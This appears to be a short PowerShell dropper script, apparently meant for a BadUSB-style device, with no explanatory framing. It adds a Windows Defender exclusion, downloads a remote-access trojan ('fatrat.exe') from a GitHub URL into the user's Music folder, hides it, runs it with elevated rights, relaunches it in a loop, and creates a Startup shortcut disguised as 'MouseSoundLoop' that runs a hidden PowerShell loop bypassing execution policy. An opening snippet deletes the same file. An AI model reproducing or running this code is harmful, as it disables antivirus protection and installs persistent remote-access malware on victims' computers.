

$path = Join-Path $env:USERPROFILE "Music\fatrat.exe"

if (Test-Path $path) {
    Remove-Item $path -Force
    Write-Output "rat.exe deleted."
} else {
    Write-Output "File not found."
}






Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

$url = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/fatrat.exe"
$dest = "$env:USERPROFILE\Music\fatrat.exe"

Invoke-WebRequest -Uri $url -OutFile $dest

Set-ItemProperty -Path $dest -Name Attributes -Value Hidden

Start-Process -FilePath $dest -Verb RunAs   



while ($true) {
    Start-Process "$env:USERPROFILE\Music\fatrat.exe"
    Start-Sleep -Seconds 20
}






$exePath = "$env:USERPROFILE\Music\fatrat.exe"


$loopScript = "$env:USERPROFILE\Music\soundloop.ps1"


@"
while ($true) {
    Start-Process "$exePath"
    Start-Sleep -Seconds 20
}
"@ | Set-Content -Path $loopScript -Encoding UTF8


$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"


$shortcut = Join-Path $startup "MouseSoundLoop.lnk"

$wsh = New-Object -ComObject WScript.Shell
$sc = $wsh.CreateShortcut($shortcut)
$sc.TargetPath = "powershell.exe"
$sc.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$loopScript`""
$sc.Save()
